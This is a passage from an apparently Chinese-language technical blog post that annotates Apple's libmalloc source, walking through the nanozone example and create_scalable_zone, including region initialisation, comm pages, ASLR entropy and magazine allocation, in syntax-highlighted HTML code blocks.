class="keyword">nanozone_t</span>;</span><br></pre></td></tr></table></figure>
<p>在实际的使用中，代码是这样写的。详细的<code>nano_zone</code>创建，会在下文出现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SZONE_PAGED_SIZE	((sizeof(nanozone_t) + vm_page_size - <span class="number">1</span>) &amp; ~ (vm_page_size - <span class="number">1</span>))</span></span><br><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">foo()&#123;</span><br><span class="line">	<span class="keyword">nanozone_t</span>	*nanozone;</span><br><span class="line">	nanozone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="comment">/*对nano_zone进行处理，设置内部数据*/</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)nanozone; <span class="comment">//强制转换指针类型，外部结构只能通过malloc_zone_t的殊绝结构来调用malloc_zone_t中的一些函数，来接进行数据处理。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="create_scalable_zone">create_scalable_zone</h3><p>该函数实现了helper_zone的创建以及相关数据的初始化。</p>
<h4 id="comm_pages">comm pages</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * The shared kernel/user "comm page(s)":</span></span><br><span class="line"> <span class="comment">//*</span></span><br><span class="line"> <span class="comment">//* The last several pages of every address space are reserved for the kernel/user</span></span><br><span class="line"> <span class="comment">//* "comm area". During system initialization, the kernel populates the comm pages with</span></span><br><span class="line"> <span class="comment">//* code customized for the particular processor and platform</span></span><br></pre></td></tr></table></figure>
<p><code>comm pages</code>是系统初始化时创建的一块共享的内存区域，保存了一些系统的数据。在<code>libmalloc</code>中有不少地方都用到了<code>comm pages</code>来获取系统的属性。</p>
<h4 id="源码注释">源码注释</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">create_scalable_zone(<span class="keyword">size_t</span> initial_size, <span class="keyword">unsigned</span> debug_flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">szone_t</span>	*szone;</span><br><span class="line">	<span class="keyword">uint64_t</span>	hw_memsize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断comm page的版本是否符合要求</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__)</span></span><br><span class="line">	<span class="keyword">if</span> (_COMM_PAGE_VERSION_REQD &gt; (*((<span class="keyword">uint16_t</span> *)_COMM_PAGE_VERSION))) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** ERROR - comm page version mismatch.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* get memory for the zone. */</span></span><br><span class="line">	<span class="comment">//从内核中获取了内存空间，对应szone的大小，因为一些调试参数的不同，内存的布局可能会不同。</span></span><br><span class="line">	<span class="comment">// #define SZONE_PAGED_SIZE		round_page_quanta((sizeof(szone_t))) </span></span><br><span class="line">	<span class="comment">// SZONE_PAGED_SIZE 是szone_t的大小根据page大小对齐之后的大小</span></span><br><span class="line">	szone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (!szone)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* set up the szone structure */</span></span><br><span class="line">	<span class="comment">// 调试信息的设置以及调试日志的设置</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> <span class="number">0</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">warning</span> CHECK_REGIONS enabled</span></span><br><span class="line">	debug_flags |= CHECK_REGIONS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> <span class="number">0</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">warning</span> LOG enabled</span></span><br><span class="line">	szone-&gt;log_address = ~<span class="number">0</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">//zone中与tiny相关的数据初始化</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		typedef struct region_hash_generation &#123;</span><br><span class="line">			size_t		num_regions_allocated;</span><br><span class="line">			size_t		num_regions_allocated_shift; // log2(num_regions_allocated)</span><br><span class="line">			region_t		*hashed_regions;  // hashed by location</span><br><span class="line">			struct		region_hash_generation *nextgen;</span><br><span class="line">		&#125; region_hash_generation_t;</span><br><span class="line">	*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		...</span><br><span class="line">		_malloc_lock_s				tiny_regions_lock CACHE_ALIGN;</span><br><span class="line">		size_t						num_tiny_regions;</span><br><span class="line">		size_t						num_tiny_regions_dealloc;</span><br><span class="line">		region_hash_generation_t	*tiny_region_generation;</span><br><span class="line">		region_hash_generation_t	trg[2];</span><br><span class="line"></span><br><span class="line">		int					num_tiny_magazines;</span><br><span class="line">		unsigned			num_tiny_magazines_mask;</span><br><span class="line">		int					num_tiny_magazines_mask_shift;</span><br><span class="line">		magazine_t			*tiny_magazines; // array of per-processor magazines</span><br><span class="line"></span><br><span class="line">		uintptr_t			last_tiny_advise;</span><br><span class="line">		...</span><br><span class="line">	*/</span></span><br><span class="line">	szone-&gt;trg[<span class="number">0</span>].nextgen = &amp;(szone-&gt;trg[<span class="number">1</span>]);</span><br><span class="line">	szone-&gt;trg[<span class="number">1</span>].nextgen = &amp;(szone-&gt;trg[<span class="number">0</span>]);</span><br><span class="line">	szone-&gt;tiny_region_generation = &amp;(szone-&gt;trg[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;hashed_regions = szone-&gt;initial_tiny_regions;</span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;num_regions_allocated = INITIAL_NUM_REGIONS;</span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		初始化之后数相关数据结构如下</span><br><span class="line">----------------------------------</span><br><span class="line">|num_tiny_regions                |</span><br><span class="line">----------------------------------</span><br><span class="line">|num_tiny_regions_dealloc        |</span><br><span class="line">----------------------------------												 </span><br><span class="line">|tiny_region_generation = &amp;trg[0]| </span><br><span class="line">----------------------------------      --------------------------------------------------------- </span><br><span class="line">|trg[0]                          |------|num_regions_allocated = INITIAL_NUM_REGIONS            |&lt;-----</span><br><span class="line">----------------------------------      ---------------------------------------------------------     |</span><br><span class="line">|trg[1]                          |---   |num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT|     |</span><br><span class="line">---------------------------------|  |   ---------------------------------------------------------     |</span><br><span class="line">|num_tiny_magazines              |  |   |hashed_regionsr = initial_tiny_regions                 |=====|=====</span><br><span class="line">----------------------------------  |   ---------------------------------------------------------     |   ||</span><br><span class="line">|num_tiny_magazines_mask         |  |   |nextgen = &amp;trg[1]                                      |---  |   ||</span><br><span class="line">----------------------------------  |   ---------------------------------------------------------  |  |   ||</span><br><span class="line">|num_tiny_magazines_mask_shift   |  |   ---------------------------------------------------------  |  |   ||</span><br><span class="line">----------------------------------  ----|num_regions_allocated = 0                              |&lt;--  |   ||  </span><br><span class="line">|tiny_magazines                  |      ---------------------------------------------------------     |   ||  </span><br><span class="line">----------------------------------      |num_regions_allocated_shift = 0                        |     |   ||  </span><br><span class="line">|last_tiny_advise                |      ---------------------------------------------------------     |   ||</span><br><span class="line">----------------------------------      |hashed_regions = NULL                                  |     |   ||</span><br><span class="line">|initial_tiny_regions            |&lt;===  ---------------------------------------------------------     |   ||</span><br><span class="line">----------------------------------  ||  |nextgen = &amp;trg[0]                                      |------   ||</span><br><span class="line">                                    ||  ---------------------------------------------------------         ||</span><br><span class="line">                                    =======================================================================	</span><br><span class="line">												</span><br><span class="line">	*/</span></span><br><span class="line">	<span class="comment">//zone中与small相关的数据初始化</span></span><br><span class="line">	szone-&gt;srg[<span class="number">0</span>].nextgen = &amp;(szone-&gt;srg[<span class="number">1</span>]);</span><br><span class="line">	szone-&gt;srg[<span class="number">1</span>].nextgen = &amp;(szone-&gt;srg[<span class="number">0</span>]);</span><br><span class="line">	szone-&gt;small_region_generation = &amp;(szone-&gt;srg[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	szone-&gt;small_region_generation-&gt;hashed_regions = szone-&gt;initial_small_regions;</span><br><span class="line">	szone-&gt;small_region_generation-&gt;num_regions_allocated = INITIAL_NUM_REGIONS;</span><br><span class="line">	szone-&gt;small_region_generation-&gt;num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化之后完全与tiny相同，只是变量不同。</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Initialize variables that size the free list for SMALL allocations based</span><br><span class="line">	 * upon the amount of memory in the system.  Switch to a larger number of</span><br><span class="line">	 * free list entries at 1GB.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="comment">// 初始化一些变量，根据系统中的内存的用量来计算SMALL分配列表的大小时将会用到这些变量。</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// * The shared kernel/user "comm page(s)":</span></span><br><span class="line"> <span class="comment">//*</span></span><br><span class="line"> <span class="comment">//* The last several pages of every address space are reserved for the kernel/user</span></span><br><span class="line"> <span class="comment">//* "comm area". During system initialization, the kernel populates the comm pages with</span></span><br><span class="line"> <span class="comment">//* code customized for the particular processor and platform.</span></span><br><span class="line"> <span class="comment">//*1073741824</span></span><br><span class="line"> <span class="comment">//* Because Mach VM cannot map the last page of an address space, we don't use it</span></span><br><span class="line"> <span class="comment">//</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//----------根据是否需要使用large，做出不同的初始化---------------start-------------</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__) || defined(__arm__) || defined(__arm64__)</span></span><br><span class="line">	<span class="keyword">if</span> ((hw_memsize = *(<span class="keyword">uint64_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_MEMORY_SIZE) &gt;= (<span class="number">1U</span>LL &lt;&lt; <span class="number">30</span>))</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="keyword">size_t</span>	uint64_t_size = <span class="keyword">sizeof</span>(hw_memsize);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == sysctlbyname(<span class="string">"hw.memsize"</span>, &amp;hw_memsize, &amp;uint64_t_size, <span class="number">0</span>, <span class="number">0</span>) &amp;&amp;</span><br><span class="line">		hw_memsize &gt;= (<span class="number">1U</span>LL &lt;&lt; <span class="number">30</span>))</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	&#123;</span><br><span class="line">		szone-&gt;is_largemem = <span class="number">1</span>;</span><br><span class="line">		szone-&gt;num_small_slots = NUM_SMALL_SLOTS_LARGEMEM;</span><br><span class="line">		szone-&gt;large_threshold = LARGE_THRESHOLD_LARGEMEM;</span><br><span class="line">		szone-&gt;vm_copy_threshold = VM_COPY_THRESHOLD_LARGEMEM;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		szone-&gt;is_largemem = <span class="number">0</span>;</span><br><span class="line">		szone-&gt;num_small_slots = NUM_SMALL_SLOTS;</span><br><span class="line">		szone-&gt;large_threshold = LARGE_THRESHOLD;</span><br><span class="line">		szone-&gt;vm_copy_threshold = VM_COPY_THRESHOLD;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> LARGE_CACHE</span></span><br><span class="line">	szone-&gt;large_entry_cache_reserve_limit =</span><br><span class="line">	hw_memsize &gt;&gt; <span class="number">10</span>; <span class="comment">// madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */</span></span><br><span class="line">	<span class="keyword">int32_t</span> libSystemVersion  = NSVersionOfLinkTimeLibrary(<span class="string">"System"</span>);</span><br><span class="line">	<span class="keyword">if</span> ((-<span class="number">1</span> != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; <span class="number">16</span>) &lt; <span class="number">112</span>) <span class="comment">/* CFSystemVersionSnowLeopard */</span>)</span><br><span class="line">		szone-&gt;large_legacy_reset_mprotect = TRUE;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		szone-&gt;large_legacy_reset_mprotect = FALSE;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">//----------根据是否需要使用large，做出不同的初始化---------------end----------------</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Prepare ASLR</span></span><br><span class="line">	<span class="comment">// ---------处理ASLR相关的内容---------------------------------start---------------</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__ || __x86_64__ || __arm64__ || TARGET_OS_EMBEDDED</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = <span class="number">0x8fe00000</span>;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">3</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">elif</span> __x86_64__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK64;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">16</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">elif</span> __arm64__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK64;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">7</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">3</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// assert(((1 &lt;&lt; entropic_bits) - 1) &lt;&lt; SMALL_BLOCKS_ALIGN &lt; (stackbase - MAXSSIZ - ENTROPIC_KABILLION));</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> != _dyld_get_image_slide((<span class="keyword">const</span> <span class="keyword">struct</span> mach_header*)_NSGetMachExecuteHeader())) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == entropic_address) &#123;</span><br><span class="line">			<span class="keyword">uintptr_t</span> t = stackbase - MAXSSIZ - ((<span class="keyword">uintptr_t</span>) (malloc_entropy[<span class="number">1</span>] &amp; ((<span class="number">1</span> &lt;&lt; entropic_bits) - <span class="number">1</span>)) &lt;&lt; SMALL_BLOCKS_ALIGN);</span><br><span class="line">			(<span class="keyword">void</span>)__sync_bool_compare_and_swap(&amp;entropic_limit, <span class="number">0</span>, t); <span class="comment">// Just one initialization please</span></span><br><span class="line">			(<span class="keyword">void</span>)__sync_bool_compare_and_swap(&amp;entropic_address, <span class="number">0</span>, t - ENTROPIC_KABILLION); <span class="comment">// Just one initialization please</span></span><br><span class="line">		&#125;</span><br><span class="line">		debug_flags &amp;= ~DISABLE_ASLR;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// zero slide when ASLR has been disabled by boot-arg. Eliminate cloaking.</span></span><br><span class="line">		malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">		debug_flags |= DISABLE_ASLR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	debug_flags |= DISABLE_ASLR;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// ---------处理ASLR相关的内容---------------------------------end---------------</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Initialize the security token.</span></span><br><span class="line">	<span class="comment">// ---------初始化外部调用函数---------------------------------start-------------</span></span><br><span class="line">	szone-&gt;cookie = (<span class="keyword">uintptr_t</span>)malloc_entropy[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">	szone-&gt;basic_zone.version = <span class="number">8</span>;</span><br><span class="line">	szone-&gt;basic_zone.size = (<span class="keyword">void</span> *)szone_size;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">malloc</span> = (<span class="keyword">void</span> *)szone_malloc;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">calloc</span> = (<span class="keyword">void</span> *)szone_calloc;</span><br><span class="line">	szone-&gt;basic_zone.valloc = (<span class="keyword">void</span> *)szone_valloc;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">free</span> = (<span class="keyword">void</span> *)szone_free;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">realloc</span> = (<span class="keyword">void</span> *)szone_realloc;</span><br><span class="line">	szone-&gt;basic_zone.destroy = (<span class="keyword">void</span> *)szone_destroy;</span><br><span class="line">	szone-&gt;basic_zone.batch_malloc = (<span class="keyword">void</span> *)szone_batch_malloc;</span><br><span class="line">	szone-&gt;basic_zone.batch_free = (<span class="keyword">void</span> *)szone_batch_free;</span><br><span class="line">	szone-&gt;basic_zone.introspect = (<span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span> *)&amp;szone_introspect;</span><br><span class="line">	szone-&gt;basic_zone.memalign = (<span class="keyword">void</span> *)szone_memalign;</span><br><span class="line">	szone-&gt;basic_zone.free_definite_size = (<span class="keyword">void</span> *)szone_free_definite_size;</span><br><span class="line">	szone-&gt;basic_zone.pressure_relief = (<span class="keyword">void</span> *)szone_pressure_relief;</span><br><span class="line"></span><br><span class="line">	szone-&gt;basic_zone.reserved1 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	szone-&gt;basic_zone.reserved2 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	mprotect(szone, <span class="keyword">sizeof</span>(szone-&gt;basic_zone), PROT_READ); <span class="comment">/* Prevent overwriting the function pointers in basic_zone. */</span></span><br><span class="line"></span><br><span class="line">	szone-&gt;debug_flags = debug_flags;</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;large_szone_lock);</span><br><span class="line">	<span class="comment">// ---------初始化外部调用函数---------------------------------end-------------</span></span><br><span class="line">	</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__ppc__) || defined(__ppc64__)</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * In the interest of compatibility for PPC applications executing via Rosetta,</span><br><span class="line">	 * arrange to zero-fill allocations as occurred by side effect in Leopard and earlier.</span><br><span class="line">	 */</span></span><br><span class="line">	zeroify_scalable_zone((<span class="keyword">malloc_zone_t</span> *)szone);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	szone-&gt;cpu_id_key = -<span class="number">1U</span>L; <span class="comment">// Unused.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Query the number of configured processors.</span></span><br><span class="line">	<span class="comment">// Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives</span></span><br><span class="line">	<span class="comment">// the same behavior as the original scalable malloc. MP gets per-CPU magazines</span></span><br><span class="line">	<span class="comment">// that scale (way) better.</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__) || defined(__arm__) || defined(__arm64__)</span></span><br><span class="line">	<span class="keyword">int</span> nproc = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_NCPUS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">int</span> nproc = sysconf(_SC_NPROCESSORS_CONF);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// ------为每个一个cpu都申请一个tiny的内存空间，并初始化相关数据--------start</span></span><br><span class="line">	<span class="comment">//根据cpu的根数，计算获得需要多少个tiny的内存空间</span></span><br><span class="line">	szone-&gt;num_tiny_magazines = (nproc &gt; <span class="number">1</span>) ? MIN(nproc, TINY_MAX_MAGAZINES) : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIXME vm_allocate() based on number of configured CPUs</span></span><br><span class="line">	<span class="comment">//申请需要的内存空间</span></span><br><span class="line">	<span class="keyword">magazine_t</span> *tiny_magazines = allocate_pages(<span class="literal">NULL</span>, TINY_MAGAZINE_PAGED_SIZE, <span class="number">0</span>,</span><br><span class="line">												SCALABLE_MALLOC_ADD_GUARD_PAGES, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == tiny_magazines)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//将申请的内存空间赋值到szone中相关的字段上</span></span><br><span class="line">	szone-&gt;tiny_magazines = &amp;(tiny_magazines[<span class="number">1</span>]); <span class="comment">// szone-&gt;tiny_magazines[-1] is the Depot</span></span><br><span class="line"></span><br><span class="line">	<span 